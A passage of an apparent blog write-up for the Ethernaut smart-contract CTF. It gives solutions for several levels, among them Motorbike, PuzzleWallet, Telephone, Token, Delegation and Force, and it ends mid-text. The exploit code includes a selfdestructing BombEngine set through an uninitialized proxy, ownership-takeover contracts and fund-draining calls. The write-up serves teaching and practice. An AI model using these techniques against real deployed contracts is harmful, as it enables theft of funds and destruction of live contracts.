</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">24</span><span></span><span class="token" style="color:#c586c0">await</span><span> contract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">execute</span><span class="token" style="color:#d4d4d4">(</span><span>player</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#dcdcaa">toWei</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&#x27;0.002&#x27;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#ce9178">&#x27;0x0&#x27;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span> </span><span class="token" style="color:#6a9955">// Draining funds</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">25</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">26</span><span></span><span class="token" style="color:#c586c0">await</span><span> contract</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">setMaxBalance</span><span class="token" style="color:#d4d4d4">(</span><span>player</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#6a9955">// It will convert upon call </span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">27</span>
</span></code></div></pre>
<p class="chakra-text css-0" node="[object Object]">Challenge solved ✅</p>
<h2 class="chakra-heading css-1uc67dn" id="motorbike">Motorbike</h2>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Challenge description</span></p>
<blockquote>
<p class="chakra-text css-0" node="[object Object]">Ethernaut&#x27;s motorbike has a brand new upgradeable engine design.
Would you be able to selfdestruct its engine and make the motorbike unusable ?
Things that might help:
EIP-1967
UUPS upgradeable pattern
Initializable contract</p>
</blockquote>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Analysis</span></p>
<p class="chakra-text css-0" node="[object Object]">To solve this challenge, we need to be familiar with both <a class="chakra-link css-9olwc6" href="https://github.com/OpenZeppelin/openzeppelin-upgrades/blob/master/packages/core/contracts/Initializable.sol">Initializable</a> and most importantly  the <a class="chakra-link css-9olwc6" href="https://eips.ethereum.org/EIPS/eip-1967">EIP-1967</a></p>
<p class="chakra-text css-0" node="[object Object]">After going through all the reading material, as usual I drew the diagram to understand the core logic of the contracts.</p>
<p class="chakra-text css-0" node="[object Object]"><div class="chakra-stack css-bwdt07"><div class="chakra-stack css-1pb7l90"><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138012/3ac10a42b6cb747f06aad171856c6d4814105583603857fbc5fd1e2549969c23_usrhte.png" alt="Motorbike Diagram" style="scale:1.2px;width:100%"/></div><p class="chakra-text css-1qz7fzr">Motorbike Diagram</p></div></div></p>
<p class="chakra-text css-0" node="[object Object]">After drawing the diagram, I had many unanswered questions the most important one did we <code class="inline-code">initialize</code> the engine contract or not !
I really know where the address of the <em>Engine</em> contract is in storage so I can check that !</p>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span class="token" style="color:#569CD6">const</span><span> engineAddress </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#c586c0">await</span><span> web3</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">eth</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">getStorageAt</span><span class="token" style="color:#d4d4d4">(</span><span>instance</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#ce9178">&#x27;0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc&#x27;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span><span></span><span class="token" style="color:#6a9955">// let&#x27;s check the value</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">4</span><span></span><span class="token" style="color:#c586c0">await</span><span> web3</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">eth</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">call</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">{</span><span class="token literal-property" style="color:#9cdcfe">to</span><span class="token" style="color:#d4d4d4">:</span><span>engineAddress</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#c586c0">from</span><span class="token" style="color:#d4d4d4">:</span><span>player</span><span class="token" style="color:#d4d4d4">,</span><span class="token literal-property" style="color:#9cdcfe">data</span><span class="token" style="color:#d4d4d4">:</span><span>web3</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">eth</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">abi</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">encodeFunctionSignature</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&#x27;upgrader()&#x27;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">}</span><span class="token" style="color:#d4d4d4">)</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">5</span><span></span><span class="token" style="color:#6a9955">// returned 0x000000</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">6</span><span></span><span class="token" style="color:#6a9955">// the initialize() wasn&#x27;t called and that&#x27;s our -----</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">7</span><span></span><span class="token" style="color:#d4d4d4">**</span><span class="token" style="color:#4ec9b0">Exploitation</span><span class="token" style="color:#d4d4d4">**</span><span> </span><span class="token" style="color:#d4d4d4">!</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">8</span>
</span></code></div></pre>
<p class="chakra-text css-0" node="[object Object]"><span class="chakra-text css-gv9qss">Exploitation</span></p>
<ol>
<li>initialize the <em>Engine</em> contract so we become the <span class="chakra-text css-gv9qss">upgrader</span>.</li>
<li>upgrade our <em>Engine</em> contract to our bomb contract ( which will selfdestruct )</li>
<li>call selfdestruct, the call will be done through <em>delegateCall</em> so the actual <em>Engine</em> will be destructed !</li>
</ol>
<p class="chakra-text css-0" node="[object Object]">our evil contract</p>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span>contract </span><span class="token" style="color:#4ec9b0">BombEngine</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span> 
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span><span>    bytes32 internal constant _IMPLEMENTATION_SLOT </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#b5cea8">0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">4</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">destruct</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">5</span><span>        </span><span class="token" style="color:#dcdcaa">selfdestruct</span><span class="token" style="color:#d4d4d4">(</span><span> </span><span class="token" style="color:#dcdcaa">payable</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span> </span><span class="token" style="color:#b5cea8">0x84e7a3679A82C2766Ff8382862ab883FF9460307</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">6</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">7</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">8</span>
</span></code></div></pre>
<pre><div class="codeStyle" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-js" style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">1</span><span class="token" style="color:#569CD6">const</span><span> destructData</span><span class="token" style="color:#d4d4d4">=</span><span> web3</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">eth</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">abi</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">encodeFunctionSignature</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&#x27;destruct()&#x27;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">2</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">3</span><span></span><span class="token" style="color:#569CD6">const</span><span> data</span><span class="token" style="color:#d4d4d4">=</span><span> web3</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">eth</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">abi</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">encodeFunctionCall</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">4</span><span>    </span><span class="token literal-property" style="color:#9cdcfe">name</span><span class="token" style="color:#d4d4d4">:</span><span> </span><span class="token" style="color:#ce9178">&#x27;upgradeToAndCall&#x27;</span><span class="token" style="color:#d4d4d4">,</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">5</span><span>    </span><span class="token literal-property" style="color:#9cdcfe">type</span><span class="token" style="color:#d4d4d4">:</span><span> </span><span class="token" style="color:#ce9178">&#x27;function&#x27;</span><span class="token" style="color:#d4d4d4">,</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">6</span><span>    </span><span class="token literal-property" style="color:#9cdcfe">inputs</span><span class="token" style="color:#d4d4d4">:</span><span> </span><span class="token" style="color:#d4d4d4">[</span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">7</span><span>        </span><span class="token literal-property" style="color:#9cdcfe">type</span><span class="token" style="color:#d4d4d4">:</span><span> </span><span class="token" style="color:#ce9178">&#x27;address&#x27;</span><span class="token" style="color:#d4d4d4">,</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">8</span><span>        </span><span class="token literal-property" style="color:#9cdcfe">name</span><span class="token" style="color:#d4d4d4">:</span><span> </span><span class="token" style="color:#ce9178">&#x27;newImplementation&#x27;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">9</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#d4d4d4">{</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">10</span><span>        </span><span class="token literal-property" style="color:#9cdcfe">type</span><span class="token" style="color:#d4d4d4">:</span><span> </span><span class="token" style="color:#ce9178">&#x27;bytes&#x27;</span><span class="token" style="color:#d4d4d4">,</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">11</span><span>        </span><span class="token literal-property" style="color:#9cdcfe">name</span><span class="token" style="color:#d4d4d4">:</span><span> </span><span class="token" style="color:#ce9178">&#x27;data&#x27;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">12</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span class="token" style="color:#d4d4d4">]</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">13</span><span></span><span class="token" style="color:#d4d4d4">}</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#d4d4d4">[</span><span>bombEngineAddress</span><span class="token" style="color:#d4d4d4">,</span><span>destructData</span><span class="token" style="color:#d4d4d4">]</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">14</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">15</span><span></span><span class="token" style="color:#c586c0">await</span><span> web3</span><span class="token" style="color:#d4d4d4">.</span><span class="token property-access">eth</span><span class="token" style="color:#d4d4d4">.</span><span class="token method property-access" style="color:#dcdcaa">sendTransaction</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">{</span><span class="token literal-property" style="color:#9cdcfe">to</span><span class="token" style="color:#d4d4d4">:</span><span>engineAddress</span><span class="token" style="color:#d4d4d4">,</span><span class="token" style="color:#c586c0">from</span><span class="token" style="color:#d4d4d4">:</span><span>player</span><span class="token" style="color:#d4d4d4">,</span><span class="token literal-property" style="color:#9cdcfe">data</span><span class="token" style="color:#d4d4d4">:</span><span>data</span><span class="token" style="color:#d4d4d4">}</span><span class="token" style="color:#d4d4d4">)</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">16</span>
</span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">17</span><span></span><span class="token" style="color:#6a9955">// You can do a random call to the Engine contract it will revert because it&#x27;s gone !</span><span>
</span></span><span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#6a9955">18</span>
</span></code></div></pre>
<p class="chakra-text css-0" node="[object Object]">Challenge solved ✅</p></div></div><style data-emotion="css bgi5lz">.css-bgi5lz{min-height:67px;height:20vh;width:100vw;}</style><div id="footer-placeholder" class="css-bgi5lz"></div></div><style data-emotion="css 1pclkm">.css-1pclkm{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;z-index:var(--chakra-zIndices-banner);width:100vw;position:fixed;bottom:0px;height:6%;min-height:67px;background-color:var(--chakra-colors-darkBackground);color:var(--chakra-colors-lightBackground);}</style><footer id="main-footer" class="css-1pclkm"><style data-emotion="css 10btk8j">.css-10btk8j{font-style:400;font-size:var(--chakra-fontSizes-lg);text-align:center;}@media screen and (min-width: 30em){.css-10btk8j{font-size:var(--chakra-fontSizes-lg);}}@media screen and (min-width: 48em){.css-10btk8j{font-size:var(--chakra-fontSizes-2xl);}}</style><p class="chakra-text css-10btk8j">© Yassine Belkhadem, 2022 · All Copyrights Reserved.</p></footer><span></span></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"post":{"slug":"ethernaut-writeup","meta":{"title":"Openzeppelin Ethernaut - Full Writeup","date":"2022-07-27","cover-image-large":"https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659139050/large_openzeppelin_ethernaut_c431a176dd.png","cover-image-small":"https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659139052/small_openzeppelin_ethernaut_c431a176dd.pn","tags":["Cybersecurtiy","Writeups","Smart Contract Security","CTF","Ethereum","Blockchain"],"createdAt":null},"content":"# Ethernaut Full Writeup\n\n- [Ethernaut Full Writeup](#ethernaut-full-writeup)\n  - [Hello Ethernaut](#hello-ethernaut)\n  - [Fallback](#fallback)\n  - [Fallout](#fallout)\n  - [CoinFlip](#coinflip)\n  - [Telephone](#telephone)\n  - [Token](#token)\n  - [Delegation](#delegation)\n  - [Force](#force)\n  - [Vault](#vault)\n  - [King](#king)\n  - [Re-entrancy](#re-entrancy)\n  - [Elevator](#elevator)\n  - [Privacy](#privacy)\n  - [Gatekeeper One](#gatekeeper-one)\n      - [gateOne](#gateone)\n      - [gateThree](#gatethree)\n      - [gateTwo](#gatetwo)\n  - [GateKeeper Two](#gatekeeper-two)\n      - [GateOne](#gateone-1)\n      - [GateTwo](#gatetwo-1)\n    - [gateThree](#gatethree-1)\n  - [Naught Coin](#naught-coin)\n  - [Perservation](#perservation)\n  - [Recovery](#recovery)\n  - [Magic Number](#magic-number)\n  - [Alien Codex](#alien-codex)\n  - [Denial](#denial)\n  - [Shop](#shop)\n  - [Dex](#dex)\n  - [Dex 2](#dex-2)\n  - [Challenge Description](#challenge-description)\n      - [Solidity Contract for test and for the token3](#solidity-contract-for-test-and-for-the-token3)\n  - [PuzzleWallet](#puzzlewallet)\n  - [Motorbike](#motorbike)\n\n## Hello Ethernaut\n\n\u003e This challenge is a warm-up challenge and for those who doesn't know how to interact with contracts using the js libraries.\n\n```js\nawait contract.info()\nawait contract.info1()\nawait contract.info2(\"hello\")\n\nawait contract.infoNum()\nawait contract.info42()\n\nawait contract.theMethodName()\nawait contract.method7123949()\n\n// Here we are asked to submit the password that we know to authenticate but we didn't interact with any passwords. A quick guess, password is a public field in the contract \n\nconst password = await contract.password() // We fetch the values of variables as methods\n\nawait contract.authenticate(password);\n```\n\nChallenge solved ✅\n\n## Fallback\n\n**Challenge description**\n\n\u003e You will beat this level if\n    - you claim ownership of the contract\n    - you reduce its balance to 0\n\n--------\n**Analysis**\n\na quick run through the code of the challenge, I extracted the valuable methods and variables we will be using.\n\n![Contribute Method](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138025/c323ec3e81e2a66f654995386118d6903a9758b1fa877d780d521e99db208afb_eejfmr.png)  \n\nHere we see how the contribute method works. Pretty simple we send ether and it's recorded for us.\n\n![fallback method](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138018/90f03025307c6a50bdc53647caac2e2e1e9711fb1fafb173d6765a8668e4bedf_hox5ei.png)  \n\nOkay the **receive** part. As we see here we are defining a function but without the *function* keyword. That's because the receive function is a *fallback* function, let's say some kind of function that should be existing in all smart contracts but here we are overriding its behaviour.\nActually, since the version 0.6.0 we got two functions to handle fallback cases. *fallback* and *receive*. a little explainer of how they are called ...\n\n```js\n// Explainer from: https://solidity-by-example.org/fallback/\n    // Ether is sent to contract\n    //      is msg.data empty?\n    //          /   \\ \n    //         yes  no\n    //         /     \\\n    //    receive()?  fallback() \n    //     /   \\ \n    //   yes   no\n    //  /        \\\n    //receive()  fallback()\n```\n\nSo what we need to do here actually ?\n\n1. Contribute so we have a contribution **value non nul**.\n2. Trigger the fallback function by sending ether to the contract.\n\n-----\n**Exploitation**\n\n```js\nawait contract.contribute({value:toWei(etherValue)});\nawait contract.sendTransaction({value:toWei(etherValue)});\n```\n\nChallenge solved ✅\n\n## Fallout\n\nConstructors in solidity are quite a story and they were the source of a big -----\n**Exploitation**.\nHere the challenge is quite simple. All we have is to notice the typo in the constructor function name which makes it a normal **public** function that we can call to get the contract ownership.\n\n```js\nawait contract.Fal1out();\n```\n\n## CoinFlip\n\n`Randomness is just a myth.`\n\n**Challenge description**\n\nYou'll need to use your psychic abilities to guess the correct outcome 10 times in a row.\n\n--------\n**Analysis** \n\nIn blockchain randomness is just quite the issue, not only in the blockchain really that implies for all computers systems and is due to the way we are trying to make deterministic systems have an deterministic results. The matter for the blockchain is its transparency making even finding a seed a quite impossible.\n\nHere we see the function of coinFlip\n![CoinFlip method](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138024/a4a71eed827fde83d6d4140e52f376aa5b2cbea20f1587a156118f7e65fa480b_czfni3.png)  \n\nour seed is actually `block.number` but we can know this value easily from the blockchain. So all we have is create a contract that feeds the flip function the values she expect 😈\n\n-----\n**Exploitation** \n\n![CoinFlip Attack](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138010/1c39007c6e59a8ac5b4a23a23c83efc645c1ed4665dcc7686fe83f28d39bb34a_saizwt.png)  \n\nNow all we have to do is call the contract method 10 times.\n\n## Telephone\n\n**Challenge description**\n\n- Claim ownership of the contract.\n\n--------\n**Analysis**\n\n![Telephone method](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138025/d794be949c9e5c756d0940618ff646c8dd477ab3f134d3973baac079ec09be4f_xqkdnr.png)  \n\nHere we see the condition being checked is as simple as `tx.origin != msg.sender` but what does `tx.origin` means ?\nActually `tx` is a global variable in the smart contract ( same as js global variables ) and it means the transaction that have been initiated on the function call.\nWhen we call a method from web3 actually we are interacting directly with the smart contract so it will initiate the transaction but when we call a contract from another contract the `tx.origin == caller.address` \n\n-----\n**Exploitation**\n\nBased on our analysis we understand all we need is to call the function from an evil contract and pass our address as parameter.\n\n```js\ninterface TelephoneInterface{ \n    function changeOwner(address _owner) external; \n}\n\ncontract EvilContract { \n    \n    TelephoneInterface victimContract;\n    contructor(address victimAddress) public {\n        victimContract = TelephoneInterface(victimAddress);\n    }\n\n    function becomeOwner(address newOwner){\n        victimContract.changeOwner(newOwner);\n    }\n}\n```\n\nChallenge solved ✅\n\n## Token\n\n--------\n**Analysis**\n\nThis challenge is about **unsigned integers**. We need to be extra duper careful when handling them as they *overlap*. What does that mean ? \n\n```c#\nuint8 X= 255;\nX=X+1 // X = 0 ;\n```\nNow you see it.\n\n![Token method](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138020/61490e01f7f4c0dcaaa9366ce4607e17714ff36452e562e06c8bcd0d048c335a_df2hde.png)  \n\n```js\n require(balances[msg.sender] - _value \u003e= 0); // How about we pass a big value to this poor unsigned balances[msg.sender] ?\n```\n\n-----\n**Exploitation**\n\nWe got 20 tokens, So I will be generous and give more than I own.\n\n```js\n await contract.transfer(player,21);\n```\n\nChallenge solved ✅\n\n## Delegation\n\n**Challenge description**\n\nThe goal of this level is for you to claim ownership of the instance you are given.\n\n--------\n**Analysis** \n\nHere we are exposed to the `delegateCall` function. If you don't know what this function does I will try to sum it up. It's a low level way to call a method of a contract ( in our case `pwn` ) in the context of another, it means it gets the storage values and global ones of the contract who called `delegateCall`.\n\n![Delegation pwn](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138021/2549219ff5c11b36a370c12f1dfd8326925489a9207074b29dfd7f83621353bc_m6k8pd.png)  \n\n![Delegation fallback](https://res.cloudinary.com/dsdvvwb8v/image/upload/v1659138019/7358cfd1b967281caa40f09ba74e6e9be2e11dce5bb005022749902ece0d530a_vpu7ji.png)  \n\nOkay so what is *msg.data* ?\nmsg.data can be the function selector with the parameters in a bytes encoded format\n\n-----\n**Exploitation**\n\nI wrote a contract to get the bytes, we can also use `web3.eth.abi.encodeFunctionCall` from the console.\n\n```js\ncontract Utility {\n     function pwnEncoded () public pure returns (bytes memory) {\n      return abi.encodeWithSignature(\"pwn()\"); \n    }\n```\n\n```js\nawait contract.sendTransaction({data:valueFromContract});\n```\nChallenge solved ✅\n\n## Force\n\nWe will learn another capability of smart contracts which sometimes became problematic if we rely on it.\n\n**Challenge description**\n\nThe goal of this level is to make the balance of the contract greater than zero.\n\n--------\n**Analysis**\n\nNothing to see there the contract is pretty empty. But a big security consideration that no contract can prevent incoming ethers from the blockchain. All we can do is not rely the contract balance in our contract logic.\n\n[Link for more informations](https://docs.soliditylang.org/en/develop/security-considerations.html)\n\nSo what is the method to send ethers to an empty contract or let's say a contract that has logic which tries to prevent incoming ethers. A quick googling and I came to the answer it's the method `selfdestruct(address)`\n\n\u003e The only way to remove code from the blockchain is when a contract at that address performs the selfdestruct operation. The remaining Ether stored at that address is sent to a designated target and then the storage and code is removed from the state\n\n[Docs Link](https://docs.soliditylang.org/en/develop/introduction-to-smart-contracts.html?highlight=selfdestruct#deactivate-and-self-destruct)\n\nWe got everything we need now let's hack !\n\n-----\n**Exploitation**\n\n```js\ncontract EvilContract { \n    // payable public so we can send it some ether to pass.\n    function forceSendBySacrifice(address victimAddress) payable public {\n        selfdestruct(_address);\n\n    }\n}\n```\n\n## Vault\n\n`transparency has no limits`\n\n**Challenge description**\n\nUnlock the vault to pass the level!\n\n--------\n**Analysis**\n\n![Vault 